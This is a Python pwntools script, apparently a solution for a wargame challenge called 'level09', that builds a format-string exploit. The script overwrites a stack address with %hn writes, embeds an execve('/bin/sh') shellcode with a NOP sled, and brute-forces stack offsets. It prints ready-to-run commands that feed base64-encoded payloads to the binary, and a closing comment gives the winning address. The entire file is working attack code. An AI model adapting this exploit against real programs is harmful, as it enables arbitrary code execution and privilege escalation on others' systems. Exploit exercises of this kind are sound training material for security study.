import pwn
import base64

def construct(preamble, shellcode, off1, off2, length):
    message  = preamble

    length1  = '%{}d'.format(off1 - len(preamble))
    message += length1.encode('ascii')
    message += b'%4$hn'

    length2  = '%{}d'.format(off2 + 828 - 19)
    message += length2.encode('ascii')
    message += b'%6$hn'

    message += b'w' * (length - len(message))

    assert len(message) == length

    #nop_count = length - len(message) - len(shellcode)
    #message += b'\x90' * nop_count
    #message += shellcode

    return message

def construct_export(shellcode, size, tailpad):
    total_length = 384
    shift = 0x12
    nop_sled_len = 0x10

    message  = b'\x90' * (shift + nop_sled_len)
    message += shellcode
    message += b'\x90' * (total_length - len(message))

    #headpad  = size - len(shellcode)
    #message  = b'\x90' * headpad
    #message += shellcode
    #message += b'\x90' * tailpad

    #assert headpad >= 0

    return message

exec_address = 0xbffffcbb + 8
jump_address = 0xbffffa9c


shift = 0xbffffcd7 - 0xbffffcbc


for i in range(-256, +256, 4):
    exec_address = 0xbffffcbc + 8
    jump_address = 0xbffffa9c + i

    # OUTSIDE GDB
    exec_address = 0xbffffcd7 #< -- OUTTER

    # -
    message1 = pwn.p32(jump_address + 0)
    message2 = pwn.p32(jump_address + 2)

    # -
    # Now we need to compute the offsets.
    upper = (exec_address & (0xFFFF << 16)) >> 16
    lower = (exec_address & (0xFFFF <<  0)) >>  0

    #print('Exec : %s '      % (hex(exec_address)))
    #print('Jump : %s '      % (hex(jump_address)))
    #print('Upper: %s -> %d' % (hex(upper), upper))
    #print('Lower: %s -> %d' % (hex(lower), lower))

    # -
    # Construct the message.

    preamble = message1 + b'wwww' + message2
    shellcode = bytes.fromhex('6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80')

    output1 = construct(
        preamble,
        shellcode,
        lower,
        upper,
        64
    )

    output2 = construct_export(
        shellcode=shellcode,
        size=256,
        tailpad=128,
    )

    #print('=' * 70)
    #print(output1)
    b64 = base64.b64encode(output1).decode('ascii')

    print("echo {}".format(hex(jump_address)))
    print("./level09 $(echo -e '{}' | base64 -d)".format(b64))

    #print('-' * 70)
    #print(len(output2))
    #print(output2)
    #print(base64.b64encode(output2))


### Note:  Solution is at 0xbffffacc
